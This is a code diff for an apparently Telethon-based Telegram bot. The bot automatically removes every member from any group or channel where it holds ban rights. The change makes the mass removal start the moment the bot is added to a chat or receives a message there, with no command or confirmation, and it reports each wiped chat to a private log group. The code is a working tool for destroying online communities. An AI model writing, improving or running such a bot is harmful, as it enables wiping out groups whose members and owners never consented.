@@ -80,66 +80,37 @@ async def remove_all_members(chat):
             LOG_GROUP_ID,
             f"⚠️ Lost ban rights in **{chat.title}** (`{chat.id}`), stopping cleanup."
         )
-
     finally:
         active_cleanup_tasks.pop(chat.id, None)
 
-# ───── INITIAL CHAT SCAN ───── #
-async def scan_all_chats():
-    joined_chats = []
-    async for dialog in bot.iter_dialogs():
-        entity = dialog.entity
-        if getattr(entity, "megagroup", False) or getattr(entity, "broadcast", False):
-            if hasattr(entity, "id"):
-                tracked_chats.add(entity.id)
-                joined_chats.append(entity)
+# ───── CHECK RIGHTS ───── #
+async def check_and_start(chat):
+    if chat.id in cleaned_chats or chat.id in active_cleanup_tasks:
+        return
 
-    # Log all joined chats
-    msg = "📋 **Bot is added to the following groups/channels:**\n"
-    for chat in joined_chats:
-        msg += f"• {chat.title} (`{chat.id}`)\n"
-    await bot.send_message(LOG_GROUP_ID, msg)
+    try:
+        perms = await bot.get_permissions(chat.id, "me")
+        if perms.is_admin and perms.ban_users:
+            await bot.send_message(
+                LOG_GROUP_ID,
+                f"✅ Bot has ban rights in **{chat.title}** (`{chat.id}`), starting cleanup."
+            )
+            task = asyncio.create_task(remove_all_members(chat))
+            active_cleanup_tasks[chat.id] = task
+        else:
+            await bot.send_message(
+                LOG_GROUP_ID,
+                f"❌ Bot does NOT have ban rights in **{chat.title}** (`{chat.id}`), no action taken."
+            )
+    except Exception as e:
+        if chat.id not in error_chats:
+            error_chats.add(chat.id)
+            await bot.send_message(
+                LOG_GROUP_ID,
+                f"⚠️ Error checking rights in **{chat.title}** (`{chat.id}`): {e}"
+            )
 
-    await check_ban_rights(joined_chats)
-
-# ───── BAN RIGHTS CHECK ───── #
-async def check_ban_rights(chats):
-    with_rights = []
-    without_rights = []
-
-    for chat in chats:
-        try:
-            perms = await bot.get_permissions(chat.id, "me")
-
-            if perms.is_admin and perms.ban_users:
-                with_rights.append(chat)
-                if chat.id not in cleaned_chats and chat.id not in active_cleanup_tasks:
-                    task = asyncio.create_task(remove_all_members(chat))
-                    active_cleanup_tasks[chat.id] = task
-            else:
-                without_rights.append(chat)
-
-        except Exception as e:
-            if chat.id not in error_chats:
-                await bot.send_message(LOG_GROUP_ID, f"⚠️ Error in `{chat.title}` (`{chat.id}`): {e}")
-                error_chats.add(chat.id)
-
-    # Log summary
-    summary = (
-        f"📊 **Permissions Check Summary**\n"
-        f"✅ Groups/channels with ban rights: {len(with_rights)}\n"
-        f"❌ Without ban rights: {len(without_rights)}\n"
-        f"🔁 Total checked: {len(chats)}"
-    )
-    await bot.send_message(LOG_GROUP_ID, summary)
-
-    if without_rights:
-        msg = "❌ **Groups/channels WITHOUT ban rights:**\n"
-        for chat in without_rights:
-            msg += f"• {chat.title} (`{chat.id}`)\n"
-        await bot.send_message(LOG_GROUP_ID, msg)
-
-# ───── EVENT: Bot Added to New Group ───── #
+# ───── EVENT: Bot Added ───── #
 @bot.on(events.ChatAction)
 async def on_added(event):
     if event.user_added and event.user_id == (await bot.get_me()).id:
@@ -147,25 +118,31 @@ async def on_added(event):
         tracked_chats.add(chat.id)
         await bot.send_message(
             LOG_GROUP_ID,
-            f"🆕 Bot added to: **{chat.title}** (`{chat.id}`)\nChecking permissions..."
+            f"🆕 Bot added to: **{chat.title}** (`{chat.id}`)\n🔍 Checking permissions..."
         )
-        await check_ban_rights([chat])
+        await check_and_start(chat)
 
-# ───── EVENT: Track Messages ───── #
+# ───── EVENT: Bot Receives a Message ───── #
 @bot.on(events.NewMessage())
-async def track_message_chats(event):
+async def on_message(event):
     if event.is_group or event.is_channel:
         chat = await event.get_chat()
-        tracked_chats.add(chat.id)
+        if chat.id not in tracked_chats:
+            tracked_chats.add(chat.id)
+            await bot.send_message(
+                LOG_GROUP_ID,
+                f"📨 Message received in: **{chat.title}** (`{chat.id}`)\n🔍 Checking permissions..."
+            )
+            await check_and_start(chat)
 
-# ───── /start COMMAND ───── #
+# ───── /start Command ───── #
 @bot.on(events.NewMessage(pattern="/start"))
 async def start_cmd(event):
     if event.is_private:
         await event.respond(
-            "🤖 Bot is active.\n"
-            "🔍 Monitoring all joined groups/channels.\n"
-            "🧹 Auto cleanup will run where ban rights are available."
+            "🤖 Bot is running.\n"
+            "🔍 Will auto-check every group/channel where it is added or receives a message.\n"
+            "🧹 Will clean members where ban rights are available."
         )
 
 # ───── MAIN ───── #
@@ -173,11 +150,10 @@ async def main():
     await bot.send_message(
         LOG_GROUP_ID,
         "✅ Bot started!\n"
-        "🔄 Scanning all joined groups/channels for permissions..."
+        "👁️ Waiting to be added to groups or receive messages..."
     )
-    await scan_all_chats()
     while True:
-        await asyncio.sleep(60)  # idle loop just to keep bot alive
+        await asyncio.sleep(60)
 
 print("🤖 Auto Rights Monitor Bot running...")
 bot.loop.run_until_complete(main())
